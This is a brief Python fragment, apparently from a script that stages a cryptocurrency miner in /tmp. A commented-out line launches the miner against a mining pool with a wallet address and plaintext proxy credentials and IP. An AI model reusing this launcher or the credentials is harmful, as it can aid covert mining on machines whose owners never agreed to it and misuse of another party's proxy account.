...
if not os.path.isfile('/tmp/%s/%s' %(folder_stak_rx, stak_rx)):
    ...
    workingdir = os.getcwd()
#check screen
#command = './%s -o us.flockpool.com:5555 -u RHbR1L3jYo19K6X3iFHvaUBeZAexaRo95Q -p x --no-tune --proxy=hxadjf198:qjbbwofbf17744@104.144.109.59:6144 -a gr -t %s --tls' %(stak_rx, cores)
